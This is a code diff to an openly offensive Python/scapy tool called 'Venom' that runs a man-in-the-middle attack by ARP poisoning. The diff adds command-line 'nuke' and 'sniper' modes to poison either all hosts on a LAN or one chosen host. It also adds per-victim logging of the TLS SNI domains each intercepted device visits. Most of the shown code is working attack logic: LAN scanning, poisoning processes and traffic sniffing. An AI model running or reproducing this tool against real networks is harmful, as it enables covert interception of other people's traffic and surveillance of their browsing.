@@ -4,20 +4,29 @@ from scapy.all import ARP, Ether, srp
 import cryptography
 from datetime import datetime
 from multiprocessing import Process
+import argparse
 
 # Load every useful layers
 load_layer("tls")
 load_layer("http")
 load_layer("dns")
 
+# Initializing Args
+parser = argparse.ArgumentParser(description='Venom is a multi tool that setup an MiTM via ARP Poisoning, giving access to different attack vectors.')
+parser.add_argument("-n", "--nuke", help="Using Nuke attack mode", action="store_true")
+parser.add_argument("-s", "--sniper", help="Using Sniper attack mode", action="store_true")
+parser.add_argument("-ss", "--scan_speed", help="Choosing ARP Scan speed (1-5)", default=4, type=int)
+parser.add_argument("-ml", "--mac_lookup", help="Mac Address Lookup when ARP scanning", action="store_true")
+parser.add_argument("-ir", "--ip_range", help="Targeted IP range", default="192.168.1.1/24", type=str)
+args = parser.parse_args()
 
 my_Mac = Ether().src
 my_IP = get_if_addr(conf.iface)
-arp_scan_mode = 4
-mac_look_up = True
+arp_scan_mode = args.scan_speed
+mac_look_up = args.mac_lookup
 
 def ARP_Scan():
-    target_ip = "192.168.1.1/24"
+    target_ip = args.ip_range
     arp = ARP(pdst=target_ip)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     packet = ether/arp
@@ -84,7 +93,7 @@ def mac_lookup(mac_address):
                 return mac_info
         return "None"
 
-#Processing Packets
+# Processing Packets
 def process_packet(packet):
     if "TLS Handshake - Client Hello" in str(packet):
         dt = datetime.now()
@@ -94,11 +103,12 @@ def process_packet(packet):
                 domain = str(line.strip("[]''=")[35:len(line)])
                 if domain:
                     ip_routing = str(packet).split("/")
-                    with open("sni_output.txt", "a") as f:
-                        print(str(dt) + " | " + ip_routing[3][5:] + "| " + domain, file=f)
+                    if ip_routing[3][5:] != "":
+                        with open(str(ip_routing[3][5:17]) + ".txt", "a") as f:
+                            print(str(dt) + " | " + ip_routing[3][5:] + "| " + domain, file=f)
                 else:
                     pass
-            
+
 def sniping_sniffing(p_targets, target_num):
     i = 0
     for target in p_targets:
@@ -106,7 +116,7 @@ def sniping_sniffing(p_targets, target_num):
             if int(target_num) == i:
                 target_ip = target["ip"]
     dt = datetime.now()
-    print("\n[SNIFF] - [" + str(dt) + "] - [" + str(target_ip) + "] | Starting Packet Capture !\n")
+    print("[SNIFF] - [" + str(dt) + "] - [" + str(target_ip) + "] | Starting Packet Capture !")
     sniff(filter="host "+ target_ip + " and tcp port 443", prn=process_packet)
 
 def nuke_sniffing(targets):
@@ -173,11 +183,15 @@ def nuke_loop(p_targets, router_ip, router_mac):
                         pass
 
 
-    
 #########################################################################################
 
-
 if __name__ == '__main__':
+
+    # Checking if Attack mode is selected correclty
+    if not (args.nuke or args.sniper):
+        parser.error('No attack mode selected, add --nuke or --sniper')
+    if (args.nuke and args.sniper):
+        parser.error('Both attack mode selected, choose --nuke or --sniper')
 
     # Clear Terminal
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -218,13 +232,13 @@ if __name__ == '__main__':
             router_ip = target["ip"]
 
     # Checking all available targets
-    print("\n[+] " + str(len(targets) - 2) + " Targets Found: ")
-    if mac_look_up:
+    print("\n[+] " + str(len(targets) - 1) + " Targets Found: ")
+    if args.mac_lookup:
         print("==============================================================================")
     else:
         print("\n=========================================================")
 
-    # Showing targets table to let user chose attack mode and target
+    # Showing targets table
     p_targets = targets_table(targets)
 
     # Possibility for the user to Scan again for better results.
@@ -242,16 +256,9 @@ if __name__ == '__main__':
             p_targets = targets_table(targets)
         elif relaunch.lower() == "no" or relaunch.lower() == "n":
             break
-    
-    #Defining the Attack Mode | Choosing between Sniping and Nuke
-    attack_mode = input("\n[+] Do you want to target a specific device ? If you choose NO, the script will target all devices at the same time ! (Y/N): ")
-    while attack_mode.lower() not in {'y', 'n', 'yes', 'no'}:
-        attack_mode = input("\n[-] Please input a valid answer ! (Y/N): ")
 
-    # Set Sniping mode
-    if attack_mode.lower() == "y" or attack_mode.lower() == "yes":
-        attack_mode = "sniping"
-
+    # If Sniper Mode selected, let user choose the target
+    if args.sniper:
         target_num = input("\n[+] Which device would you like to target ? (1/2/3/4/...): ")
         while target_num == "0" or int(target_num) > len(p_targets):
             target_num = input("\n[+] Please select a valid target ! (1/2/3/4/...): ")
@@ -261,18 +268,17 @@ if __name__ == '__main__':
             if i == int(target_num):
                 target_ip = target["ip"]
                 target_mac = target["mac"]
-                print("\n[+] Starting poisoning Target n°" + str(target_num) + " [" + str(target_ip) +"]...")
+                print("\n[+] Poisoning Target n°" + str(target_num) + " [" + str(target_ip) +"]...")
                 print("\n============================================================================\n")
                 break
-    # Set Nuke Mode
-    else:
-        attack_mode = "nuke"
-        print("\n[+] Nuke mode enabled ! Poisoning all devices... ")
+    # Set Nuke Mode*
+    elif args.nuke:
+        input("\n[+] Nuke mode ready ! Press Enter to launch the attack... ")
         print("\n============================================================================\n")
     
     # Launching Nuke attack
     try:
-        if attack_mode == "nuke":
+        if args.nuke:
             try:
                 p1 = Process(target=nuke_loop, args=(p_targets, router_ip, router_mac))
                 p2 = Process(target=nuke_sniffing, args=(p_targets,))
@@ -287,7 +293,7 @@ if __name__ == '__main__':
                 pass
 
     # Launching Sniping attack
-        elif attack_mode == "sniping":
+        elif args.sniper:
             try:
                 p1 = Process(target=sniping_loop, args=(p_targets, target_num, router_ip, router_mac))
                 p2 = Process(target=sniping_sniffing, args=(p_targets, target_num))
@@ -307,7 +313,7 @@ if __name__ == '__main__':
     print("=== [-] Spoofing Canceled ! ===")
     print("===============================")
     try:
-        if attack_mode == "sniping":
+        if args.sniper:
             i = 0
             for target in p_targets:
                 i = i + 1
@@ -324,7 +330,7 @@ if __name__ == '__main__':
                         print("\n[-] " + str(dt) + " | Can't restore: " + target_ip + " | Exiting... ")
                         SystemExit()
 
-        elif attack_mode == "nuke":
+        elif args.nuke:
             # 
             for target in p_targets:
                 try:
